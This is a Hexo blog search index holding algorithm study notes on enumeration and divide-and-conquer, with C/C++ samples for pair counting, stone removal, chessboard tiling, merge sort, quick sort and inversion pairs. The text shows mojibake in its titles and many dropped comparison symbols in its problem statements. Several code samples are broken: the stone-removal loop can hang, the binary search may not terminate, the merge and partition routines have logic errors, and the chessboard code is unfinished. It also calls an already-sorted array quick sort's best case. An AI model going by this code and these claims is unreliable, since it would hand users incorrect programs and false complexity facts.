<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>üëìEnumination</title>
    <url>/2025/02/18/article-1/</url>
    <content><![CDATA[<h1>1. The main idea of enumeration algorithm</h1>
<blockquote>
<p>‚ÄúList all possible solutions to this problem one by one, and in the process of listing, check each possible solution to see if it is the true solution to the problem.‚Äù</p>
</blockquote>
<span id="more"></span> 
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a><br>
<strong>Instruction:</strong></p>
<ol>
<li>
<p><strong>Identify the enumeration objects</strong></p>
</li>
<li>
<p><strong>List possible solutions one by one</strong></p>
</li>
<li>
<p><strong>Verify each possible solution one by one</strong></p>
</li>
</ol>
<h1>2. Typical application examples of enumeration algorithm</h1>
<h2 id="2-1-Array-paring">2.1 Array paring</h2>
<hr>
<h3 id="2-1-1-Problem-Description">2.1.1 <strong>Problem Description</strong></h3>
<p>The problem presented involves selecting two distinct numbers from an array of size n such that their sum is divisible by a given integer $k$. The challenge is to calculate how many different pairs can be chosen, while considering that pairs like $(a_1, a_2)$ and $(a_2, a_1)$ are considered the same.</p>
<p>Given:</p>
<ul>
<li>
<p>An array $A$ of length $n$.</p>
</li>
<li>
<p>A positive integer $k$.</p>
</li>
<li>
<p>The task is to select pairs of numbers $a_i$ and $a_j$ (where $i &lt; j$) such that:</p>
<p>$(a_i + a_j) % k = 0$</p>
</li>
</ul>
<p>Where $a_i$ and $a_j$ are two numbers chosen from the array.</p>
<h3 id="2-1-2-Algorithm-and-Approach">2.1.2 <strong>Algorithm and Approach</strong></h3>
<ol>
<li>
<p><strong>Brute Force Enumeration</strong>: The brute force approach would involve looping through all possible pairs of numbers in the array and checking whether their sum is divisible by $k$. This approach has a time complexity of $O(n^2)$, where $n$ is the size of the array. For large values of $n$, this results in $O(10^{12})$ operations, which is computationally expensive.</p>
</li>
<li>
<p><strong>Optimization with Remainder Buckets</strong>: The key observation is to use modulo arithmetic. If we can categorize the numbers by their remainders when divided by k, then we can use this to reduce the complexity.<br>
$B_0$  for numbers where  $a_i % k = 0$ ;  $B_1$  for numbers where  $a_i % k = 1$‚Ä¶</p>
<p><strong>Pair Counting Function:</strong><br>
if  $(i + j) % k = 0$  and $i‚â†j$ :  $\text{count}(B_i) \times \text{count}(B_j)$<br>
if $i=j$ :  $\frac{\text{count}(B_i) \times (\text{count}(B_i) - 1)}{2}$</p>
</li>
<li>
<p><strong>Time Complexity:</strong> The time complexity of this optimized solution is  $O(n + k)$ , as we only need to iterate through the array once to categorize the numbers, and then we iterate through the  $k$  buckets to count pairs.</p>
</li>
</ol>
<h3 id="2-1-3-Code-Example">2.1.3 <strong>Code Example</strong></h3>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LL long long</span></span><br><span class="line"><span class="type">int</span> n, k;</span><br><span class="line"><span class="type">int</span> a[<span class="number">1001</span>]; <span class="comment">// Array to count numbers in remainder buckets</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in">sizeof</span>(a)); <span class="comment">// Reset the array</span></span><br><span class="line">    cin &gt;&gt; n &gt;&gt; k;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> t;</span><br><span class="line">        cin &gt;&gt; t;</span><br><span class="line">        a[t % k]++; <span class="comment">// Count numbers by remainder</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">work</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    LL ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">        <span class="type">int</span> j = (k - i) % k;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; j) <span class="keyword">break</span>; <span class="comment">// Avoid counting the same pairs twice</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i == j) ans += <span class="number">1LL</span> * a[i] * (a[i] - <span class="number">1</span>) / <span class="number">2</span>; <span class="comment">// Special case for same remainder</span></span><br><span class="line">        <span class="keyword">else</span> ans += <span class="number">1LL</span> * a[i] * a[j]; <span class="comment">// Count valid pairs from different remainder groups</span></span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-2-Stone-Removal">2.2 <strong>Stone Removal</strong></h2>
<h3 id="2-2-1-Problem-Description">2.2.1 <strong>Problem Description</strong></h3>
<p>In this problem, we are given a river with stones arranged along its length, and the goal is to remove some stones such that the remaining stones have a minimal distance between two consecutive stones. The task is to remove a maximum of  $m$  stones and maximize the minimum distance between the remaining consecutive stones.</p>
<p>Given:</p>
<ul>
<li>A sequence of stones represented as an array  $S = [s_1, s_2, \dots, s_n]$ , where the distance between two consecutive stones is provided.</li>
<li>A positive integer  $m$ , which represents the maximum number of stones that can be removed.</li>
<li>The objective is to determine the maximum minimum distance between consecutive stones after removing up to  $m$  stones.</li>
</ul>
<p>Input:</p>
<p>The input consists of multiple test cases (up to 20).</p>
<p>Each test case consists of two integers:</p>
<ul>
<li>$n$  ($2 ‚â§$  $n$  $‚â§ 1000$), representing the number of stones.</li>
<li>$m$  ($0 ‚â§  m \leq n-2$ ), the maximum number of stones that can be removed.</li>
<li>Then follow  $n-1$  integers representing the distances between adjacent stones.</li>
</ul>
<p>Output:</p>
<p>For each test case, output the maximum possible minimum distance between any two consecutive stones after removing up to  $m$  stones.</p>
<h3 id="2-2-2-Algorithm-and-Approach">2.2.2 <strong>Algorithm and Approach</strong></h3>
<ol>
<li><strong>Validate Function</strong>¬† $C(d)$ : The function  $C(d)$  checks if we can maintain a minimum distance of  $d$  after removing up to  m  stones. We start with the first stone and try to place the subsequent stones such that their distance from the last placed stone is at least  $d$ .</li>
<li><strong>Binary Search Optimization</strong>:¬†Since  $C(d)$  is a monotonic function (if a distance  $d$  satisfies  $C(d)$ , then any distance  $d{\prime} \leq d$  also satisfies  C$(d{\prime})$ ), we can perform a binary search to find the maximum  $d$  that satisfies  $C(d)$ .</li>
<li><strong>Time Complexity</strong>: The time complexity of this approach is¬† $O(n \log(\text{n}))$ .</li>
</ol>
<h3 id="2-2-3-Code-Example">2.2.3 <strong>Code Example</strong></h3>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; dis;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Validate</span><span class="params">(<span class="type">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> k = m;  <span class="comment">// stones to be removed</span></span><br><span class="line">    <span class="type">int</span> st = <span class="number">1</span>;  <span class="comment">// position of the first stone</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> en = <span class="number">2</span>; en &lt;= n; en++) &#123;  <span class="comment">// position of the last stone</span></span><br><span class="line">        <span class="type">int</span> disCur = dis[en] - dis[st];  <span class="comment">// distance between the current stone and the last one</span></span><br><span class="line">        <span class="keyword">while</span> (disCur &lt; d) &#123;  <span class="comment">// If the distance is less than d, we remove a stone</span></span><br><span class="line">            k--;</span><br><span class="line">            en++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (k &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">// if we have removed too many stones</span></span><br><span class="line">        <span class="keyword">if</span> (en &gt; n) &#123;  <span class="comment">// special case</span></span><br><span class="line">            <span class="keyword">if</span> (st == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">// check distance between the first and last stone</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">// can move the first stone and keep the condition</span></span><br><span class="line">        &#125;</span><br><span class="line">        disCur = dis[en] - dis[st];  <span class="comment">// update the distance</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m) != EOF) &#123;</span><br><span class="line">        dis.<span class="built_in">resize</span>(n + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;dis[i]);</span><br><span class="line">            dis[i] += dis[i - <span class="number">1</span>];  <span class="comment">// compute the prefix sum</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> lb = <span class="number">0</span>, ub = <span class="number">1000</span> * <span class="number">1000</span> + <span class="number">5</span>;  <span class="comment">// upper bound for the maximum distance</span></span><br><span class="line">        <span class="keyword">while</span> (lb &lt; ub) &#123;</span><br><span class="line">            <span class="type">int</span> mid = (lb + ub) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">Validate</span>(mid)) lb = mid;  <span class="comment">// update the lower bound</span></span><br><span class="line">            <span class="keyword">else</span> ub = mid - <span class="number">1</span>;  <span class="comment">// update the upper bound</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, lb);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm Design and Analysis</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2025/02/17/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start">Quick Start</h2>
<h3 id="Create-a-new-post">Create a new post</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server">Run server</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files">Generate static files</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>üï∂Ô∏è Divide and Conquer</title>
    <url>/2025/02/24/Divide-and-Conquer-1/</url>
    <content><![CDATA[<h1 id="the-main-idea-of-divide-and-conquer-algorithm">1. The main idea
of divide and conquer algorithm</h1>
<blockquote>
<p>The divide-and-conquer strategy algorithm consists of three stages:
Divide, Conquer, and Combine. The Divide stage is where the original
problem is divided into smaller subproblems. The Conquer stage involves
recursively solving the subproblems. The Combine stage is where the
solutions to the subproblems are combined to form the solution to the
original problem.</p>
</blockquote>
<span id="more"></span>
<h1 id="divide-and-conquer-algorithm-framework">2. divide and conquer
algorithm framework</h1>
<p>The pseudocode for the divide-and-conquer algorithm is as
follows:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">divide-<span class="keyword">and</span>-<span class="built_in">conquer</span>(P):</span><br><span class="line">(<span class="number">1</span>) <span class="keyword">if</span> (|P| &lt;= n0) <span class="built_in">adhoc</span>(P);  <span class="comment">// Base case, solve the problem directly</span></span><br><span class="line">(<span class="number">2</span>) divide P into smaller subinstances P1, P2, ..., Pk;  <span class="comment">// Divide the problem</span></span><br><span class="line">(<span class="number">3</span>) <span class="keyword">for</span> (i = <span class="number">1</span>, i &lt;= k, i++) &#123;</span><br><span class="line">    yi = divide-<span class="keyword">and</span>-<span class="built_in">conquer</span>(Pi);  <span class="comment">// Recursively solve subproblems</span></span><br><span class="line">&#125;</span><br><span class="line">(<span class="number">4</span>) <span class="keyword">return</span> <span class="built_in">merge</span>(y1, ..., yk);  <span class="comment">// Combine the solutions of subproblems</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Base Case</strong> (adhoc(P)): When the size of the problem
is small enough (below a threshold¬† <span
class="math inline">\(n_0\)</span> ), we use a direct approach to solve
it, without further division. This is the termination point for
recursion.</li>
<li><strong>Divide Step</strong>: In this step, the original problem¬†
<span class="math inline">\(P\)</span>¬† is divided into smaller
subproblems¬† <span class="math inline">\(P_1, P_2, ‚Ä¶, P_k\)</span> . The
goal is to make these subproblems small enough so they can be handled
easily.</li>
<li><strong>Merge Step</strong>: After solving the subproblems, their
solutions are merged together to form the solution to the original
problem. This merging process is key to the divide-and-conquer
approach.</li>
<li><strong>Designing the Strategy:</strong> The design of a
divide-and-conquer strategy involves dividing the original problem into
k smaller subproblems. This step is crucial and can be approached with
two principles.
<ul>
<li><strong>Balanced Subproblems</strong>: Ideally, the size of the
subproblems should be balanced, meaning that the problems should be
divided such that each subproblem is roughly the same size.</li>
<li><strong>Independent Subproblems</strong>: The subproblems should be
as independent as possible, meaning that the solutions to the
subproblems should not interfere with each other.</li>
</ul></li>
</ul>
<h1 id="typical-application-examples-of-divide-and-conquer-algorithm">3.
Typical application examples of divide and conquer algorithm</h1>
<h2 id="chessboard-covering-problem">3.1 Chessboard Covering
Problem</h2>
<h3 id="problem-statement">3.1.1 <strong>Problem Statement</strong></h3>
<p>Given an integer k ( 1 k ), the chessboard size is 2^k ^k . The
special square is given by coordinates (x, y) , where 0 x, y . he board
must be fully covered using <strong>L-shaped trominoes</strong>, which
come in <strong>four different orientations</strong> (numbered 1, 2, 3,
and 4 as shown in the image). Each L-tromino consists of three
squares.</p>
<figure>
<img src="attachment:b59e2c4b-c274-41ac-8fdd-0ace58db63de:image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p><strong>Input</strong></p>
<ul>
<li>An integer¬† k¬† representing the chessboard size¬† 2^k ^k .</li>
<li>Two integers¬† x, y¬† representing the position of the special
square.</li>
</ul>
<p><strong>Output</strong></p>
<ul>
<li>A¬† 2^k ^k¬† matrix where:</li>
<li>The special square is marked as 0.</li>
<li>Other cells are filled with numbers 1, 2, 3, or 4, indicating which
L-tromino covers them.</li>
<li>The output values are separated by <strong>tab spaces</strong>.</li>
</ul>
<h3 id="algorithm-and-approach">3.1.2 <strong>Algorithm and
Approach</strong></h3>
<figure>
<img src="attachment:d7796dee-ca1f-4b98-9cf0-09cb25c433d1:image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img src="attachment:0a1d8ab8-7782-43f3-bc49-0c81ebdb0a52:image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img src="attachment:4fb313a5-1781-4bc0-94c7-cc60d80d1de7:image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h3 id="code-example">3.1.3 <strong>Code Example</strong></h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> k;</span><br><span class="line"><span class="comment">// Coordinates of the special square</span></span><br><span class="line"><span class="type">int</span> dr, dc;</span><br><span class="line"><span class="type">int</span> size = <span class="built_in">pow</span>(<span class="number">2</span>, k);</span><br><span class="line"><span class="type">int</span> Board[<span class="number">1025</span>][<span class="number">1025</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fill</span><span class="params">(<span class="type">int</span> tr, <span class="type">int</span> tc, <span class="type">int</span> dr, <span class="type">int</span> dc)</span> &#123; <span class="comment">// Merge function</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ChessBoard</span><span class="params">(<span class="type">int</span> tr, <span class="type">int</span> tc, <span class="type">int</span> dr, <span class="type">int</span> dc, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (size == <span class="number">2</span>)</span><br><span class="line">		fill(tr, tc, dr, dc); <span class="comment">// Recursion base case</span></span><br><span class="line">	<span class="type">int</span> s = size / <span class="number">2</span>; <span class="comment">// Divide into subproblems</span></span><br><span class="line">	<span class="comment">// Special square is in the top-left quadrant</span></span><br><span class="line">	<span class="keyword">if</span> (dr &lt; tr + s &amp;&amp; dc &lt; tc + s) &#123;</span><br><span class="line">		ChessBoard(tr, tc, dr, dc, s); <span class="comment">// Recursively process top-left quadrant</span></span><br><span class="line">		ChessBoard(tr, tc + s, tr + s - <span class="number">1</span>, tc + s, s); <span class="comment">// Recursively process top-right quadrant</span></span><br><span class="line">		ChessBoard(tr + s, tc, tr + s, tc + s - <span class="number">1</span>, s); <span class="comment">// Recursively process bottom-left quadrant</span></span><br><span class="line">		ChessBoard(tr + s, tc + s, tr + s, tc + s, s); <span class="comment">// Recursively process bottom-right quadrant</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Special square is in the top-right quadrant</span></span><br><span class="line">	<span class="keyword">if</span> (dr &lt; tr + s &amp;&amp; dc &gt;= tc + s) &#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Special square is in the bottom-left quadrant</span></span><br><span class="line">	<span class="keyword">if</span> (dr &gt;= tr + s &amp;&amp; dc &lt; tc + s) &#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Special square is in the bottom-right quadrant</span></span><br><span class="line">	<span class="keyword">if</span> (dr &gt;= tr + s &amp;&amp; dc &gt;= tc + s) &#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="merge-sort">3.2 Merge Sort</h2>
<h3 id="problem-statement-1">3.2.1 <strong>Problem
Statement</strong></h3>
<p>classic sort problem</p>
<h3 id="algorithm-and-approach-1">3.2.2 <strong>Algorithm and
Approach</strong></h3>
<ul>
<li>Divide: Split the original array A into two equal parts</li>
<li>Conquer: If a subarray contains only one element, it is already
sorted; Otherwise, recursively divide the subarrays further</li>
<li>Merge: A function merge is used to combine two already sorted
subarrays B_1 and B_2 into a single sorted array B .</li>
</ul>
<h3 id="code-example-1">3.2.3 <strong>Code Example</strong></h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span> iDatas[], <span class="type">int</span> iBuffer[], <span class="type">int</span> iLow, <span class="type">int</span> iMid, <span class="type">int</span> iHigh)</span> &#123;</span><br><span class="line">	<span class="type">int</span> i = iLow;</span><br><span class="line">	<span class="type">int</span> j = iMid + <span class="number">1</span>;</span><br><span class="line">	<span class="type">int</span> k = iLow;</span><br><span class="line">	<span class="keyword">while</span> ((i &lt;= iMid) &amp;&amp; (j &lt;= iHigh)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (iDatas[i] &lt;= iDatas[j]) &#123;</span><br><span class="line">			iBuffer[k++] = iDatas[i++];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			iBuffer[k++] = iDatas[j++];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// Copy the remaining elements</span></span><br><span class="line">		<span class="keyword">if</span> (i &lt;= iMid) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> ii = i; ii &lt; iMid; ii++) &#123;</span><br><span class="line">				iBuffer[k++] = iDatas[ii];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> jj = j; jj &lt;= iHigh; jj++) &#123;</span><br><span class="line">				iBuffer[k++] = iDatas[jj];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mergeSort</span><span class="params">(<span class="type">int</span> iDatas[], <span class="type">int</span> iBuffer[], <span class="type">int</span> iLow, <span class="type">int</span> iHigh)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (iHigh &gt; iLow) &#123; <span class="comment">// Base case for recursion</span></span><br><span class="line">		<span class="type">int</span> iMid = (iLow + iHigh) / <span class="number">2</span>; <span class="comment">// Divide the array</span></span><br><span class="line">		mergeSort(iDatas, iBuffer, iLow, iMid); <span class="comment">// Recursive call for left half</span></span><br><span class="line">		mergeSort(iDatas, iBuffer, iMid+<span class="number">1</span>, iHigh); <span class="comment">// Recursive call for right half</span></span><br><span class="line">		merge(iDatas, iBuffer, iLow, iMid, iHigh); <span class="comment">// Merge the two halves</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = iLow; i &lt;= iHigh; i++) &#123;</span><br><span class="line">			iDatas[i] = iBuffer[i]; <span class="comment">// Copy sorted elements back to original array</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="quick-sort">3.3 Quick Sort</h2>
<h3 id="problem-statement-2">3.3.1 <strong>Problem
Statement</strong></h3>
<p>classic sort problem</p>
<h3 id="algorithm-and-approach-2">3.3.2 <strong>Algorithm and
Approach</strong></h3>
<ul>
<li><p>Divide: Split the original array A into two equal parts and one
pivot element</p>
<p><strong>Quick Sort</strong> is a <strong>Divide and Conquer</strong>
algorithm that sorts an array by selecting a <strong>pivot</strong> and
partitioning the array into two subarrays:</p>
<ol type="1">
<li><p><strong>Elements smaller than the pivot</strong> go to the
left.</p></li>
<li><p><strong>Elements greater than the pivot</strong> go to the
right.</p></li>
</ol></li>
<li><p>Conquer: If a subarray contains only one element, it is already
sorted; Otherwise, recursively divide the subarrays further</p></li>
</ul>
<aside>
<p>üí°</p>
<p><strong>Quick Sort does not have a merge step</strong>.</p>
<p>Merge Sort keeps dividing into two segments. Quick Sort keeps
dividing into three segments.</p>
</aside>
<table>
<colgroup>
<col style="width: 33%" />
<col style="width: 33%" />
<col style="width: 33%" />
</colgroup>
<thead>
<tr>
<th><strong>Sorting Algorithm</strong></th>
<th><strong>Uses Merging?</strong></th>
<th><strong>Key Operation</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Quick Sort</strong></td>
<td>‚ùå <strong>No</strong></td>
<td><strong>Partitioning</strong> (placing smaller elements on the left,
larger on the right)</td>
</tr>
<tr>
<td><strong>Merge Sort</strong></td>
<td>‚úÖ <strong>Yes</strong></td>
<td><strong>Merging</strong> (combining sorted subarrays back
together)</td>
</tr>
</tbody>
</table>
<h3 id="code-example-2">3.3.3 <strong>Code Example</strong></h3>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Quick Sort</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">int</span>&amp; iValue1, <span class="type">int</span>&amp; iValue2)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> iTemp = iValue1;</span><br><span class="line">	iValue1 = iValue2;</span><br><span class="line">	iValue2 = iTemp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">partition</span><span class="params">(<span class="type">int</span> iDatas[], <span class="type">int</span> iLow, <span class="type">int</span> iHigh)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> i = iLow + <span class="number">1</span>;</span><br><span class="line">	<span class="type">int</span> j = iHigh;</span><br><span class="line">	<span class="keyword">while</span> (i != j) &#123;</span><br><span class="line">		<span class="keyword">while</span> ((iDatas[iLow] &gt;= iDatas[i]) &amp;&amp; (i &lt;= iHigh)) &#123;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span> ((iDatas[iLow] &lt;= iDatas[j]) &amp;&amp; (j &gt;= iHigh)) &#123;</span><br><span class="line">			j--;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (i &lt; j) &#123;</span><br><span class="line">			<span class="built_in">swap</span>(iDatas[i], iDatas[j]);</span><br><span class="line">			i++;</span><br><span class="line">			j--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">swap</span>(iDatas[iLow], iDatas[j]);</span><br><span class="line">	<span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quickSort</span><span class="params">(<span class="type">int</span> iDatas[], <span class="type">int</span> iLow, <span class="type">int</span> iHigh)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (iHigh &gt; iLow) &#123;</span><br><span class="line">		<span class="type">int</span> k = <span class="built_in">partition</span>(iDatas, iLow, iHigh);</span><br><span class="line">		<span class="built_in">quickSort</span>(iDatas, iLow, k - <span class="number">1</span>);</span><br><span class="line">		<span class="built_in">quickSort</span>(iDatas, k + <span class="number">1</span>, iHigh);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="time-complexity-analysis">3.3.4 Time Complexity Analysis</h3>
<ol type="1">
<li><strong>Average-Case/Best-Case Scenario</strong>: The best case
occurs when the pivot always divides the array into two equal or nearly
equal halves, such as when the array is already sorted or the pivot
selection ensures balanced partitions (e.g., the median element).<span
class="math inline">\(O(nlogn)\)</span></li>
<li><strong>Worst-Case Scenario</strong>: The worst case occurs when the
pivot consistently produces highly unbalanced partitions, such as when
the array is already sorted (in ascending or descending order) and the
pivot is the smallest or largest element.<span
class="math inline">\(O(n^2)\)</span></li>
</ol>
<h3 id="quick-sort-improvement">3.3.5 Quick Sort improvement</h3>
<p><strong>QuickSort‚Äôs performance depends on the choice of
pivot.</strong> Randomized QuickSort mitigates this by randomly
selecting the pivot, ensuring a more balanced partition on average and
reducing the likelihood of worst-case scenarios.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">randomizedQuickSort</span><span class="params">(<span class="type">int</span> iDatas[], <span class="type">int</span> iLeft, <span class="type">int</span> iRight)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (iRight &gt; iLeft) &#123;</span><br><span class="line">        srand((<span class="type">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">        <span class="type">int</span> iAncharIndex = rand() % (iRight - iLeft + <span class="number">1</span>) + iLeft;</span><br><span class="line">        swap(iDatas[iAncharIndex], iDatas[iLeft]);</span><br><span class="line">        <span class="type">int</span> k = partition(iDatas, iLeft, iRight);</span><br><span class="line">        randomizedQuickSort(iDatas, iLeft, k<span class="number">-1</span>); <span class="comment">// Sort the left subarray A1</span></span><br><span class="line">        randomizedQuickSort(iDatas, k+<span class="number">1</span>, iRight); <span class="comment">// Sort the right subarray A3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="inversion-pair-problem">3.4 Inversion Pair Problem</h2>
<h3 id="problem-statement-3">3.4.1 <strong>Problem
Statement</strong></h3>
<p>Given an array <strong>A</strong> of <strong>n</strong> distinct
non-negative integers, an <strong>inversion pair</strong> (A[i], A[j])
is defined as a pair where¬† i &lt; j¬† and¬† A[i] &gt; A[j] . The task is
to count the number of such inversion pairs in the array.</p>
<p><strong>Input</strong></p>
<p>Each test case consists of two lines:</p>
<ol type="1">
<li><p>The first line contains an integer¬† n¬† ( 1 n ), representing the
number of elements in the array.</p></li>
<li><p>The second line contains <strong>n</strong> space-separated
integers.</p></li>
<li><p>The last input line is <strong>-1</strong>, indicating the end of
input.</p></li>
</ol>
<p><strong>Output</strong></p>
<p>For each test case, output a single integer in a new line,
representing the total number of inversion pairs in the array.</p>
